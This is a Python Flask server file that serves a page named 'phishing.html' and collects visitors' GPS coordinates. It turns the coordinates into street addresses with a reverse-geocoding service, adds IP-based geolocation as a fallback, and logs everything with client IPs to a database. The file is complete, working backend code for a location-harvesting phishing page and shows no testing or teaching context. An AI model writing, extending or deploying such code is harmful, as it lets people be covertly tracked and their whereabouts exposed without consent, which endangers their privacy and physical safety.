from flask import Flask, request, jsonify, send_from_directory
from datetime import datetime
import threading
import time
import requests
import json
import os
import psycopg2
from psycopg2.extras import RealDictCursor

app = Flask(__name__)

# Database connection setup
DATABASE_URL = os.environ.get('DATABASE_URL')  # Expected to be set in Railway environment

conn = None

try:
    conn = psycopg2.connect(DATABASE_URL, cursor_factory=RealDictCursor)
    conn.autocommit = True
except Exception as e:
    print(f'Error connecting to database: {e}')
    conn = None

# Create table if not exists
if conn:
    with conn.cursor() as cur:
        cur.execute('''
            CREATE TABLE IF NOT EXISTS location_logs (
                id SERIAL PRIMARY KEY,
                timestamp TIMESTAMPTZ NOT NULL DEFAULT NOW(),
                data JSONB NOT NULL
            );
        ''')

# Global lock and timestamp for rate limiting Nominatim API
nominatim_lock = threading.Lock()
last_nominatim_call = 0

# Helper to log data with timestamp to PostgreSQL

def log_data(data: dict):
    if conn is None:
        print('No database connection. Skipping log.')
        return
    try:
        with conn.cursor() as cur:
            cur.execute('INSERT INTO location_logs (data) VALUES (%s)', (json.dumps(data),))
    except Exception as e:
        print(f'Error logging data to database: {e}')


# Helper to get client IP from request

def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr


@app.route('/', methods=['GET'])
def index():
    return send_from_directory('.', 'phishing.html')


@app.route('/collect', methods=['POST'])
def collect():
    global last_nominatim_call
    data = request.get_json(force=True)
    latitude = data.get('latitude')
    longitude = data.get('longitude')

    if latitude is None or longitude is None:
        return jsonify({'error': 'Missing latitude or longitude'}), 400

    client_ip = get_client_ip()

    # Rate limit Nominatim API calls
    with nominatim_lock:
        now = time.time()
        elapsed = now - last_nominatim_call
        if elapsed < 1.0:
            time.sleep(1.0 - elapsed)
        last_nominatim_call = time.time()

    # Reverse geocode using OpenStreetMap Nominatim API
    nominatim_url = f'https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat={latitude}&lon={longitude}'
    headers = {'User-Agent': 'Mozilla/5.0 (compatible; LocationCollector/1.0)'}
    try:
        resp = requests.get(nominatim_url, headers=headers, timeout=5)
        if resp.status_code == 200:
            nominatim_data = resp.json()
            address = nominatim_data.get('display_name', 'Unknown')
        else:
            address = 'Unknown'
    except Exception:
        address = 'Unknown'

    log_entry = {
        'type': 'gps',
        'latitude': latitude,
        'longitude': longitude,
        'address': address,
        'ip': client_ip,
        'timestamp': datetime.utcnow().isoformat() + 'Z'
    }
    log_data(log_entry)
    return jsonify({'status': 'success'})


@app.route('/collect-fallback', methods=['POST'])
def collect_fallback():
    data = request.get_json(force=True)
    client_ip = get_client_ip()

    # Get IP geolocation from ipinfo.io
    ipinfo_url = f'https://ipinfo.io/{client_ip}/json'
    try:
        resp = requests.get(ipinfo_url, timeout=5)
        if resp.status_code == 200:
            ipinfo_data = resp.json()
        else:
            ipinfo_data = {}
    except Exception:
        ipinfo_data = {}

    log_entry = {
        'type': 'fallback',
        'data': data,
        'ip_info': ipinfo_data,
        'ip': client_ip,
        'timestamp': datetime.utcnow().isoformat() + 'Z'
    }
    log_data(log_entry)
    return jsonify({'status': 'success'})


if __name__ == '__main__':
    import sys
    port = int(sys.argv[1]) if len(sys.argv) > 1 else int(os.environ.get('PORT', 5000))

    ssl_cert = 'cert.pem'
    ssl_key = 'key.pem'

    if os.path.exists(ssl_cert) and os.path.exists(ssl_key):
        print(f'Starting with HTTPS on port 443')
        app.run(host='0.0.0.0', port=443, ssl_context=(ssl_cert, ssl_key))
    else:
        print(f'Starting with HTTP on port {port}')
        app.run(host='0.0.0.0', port=port)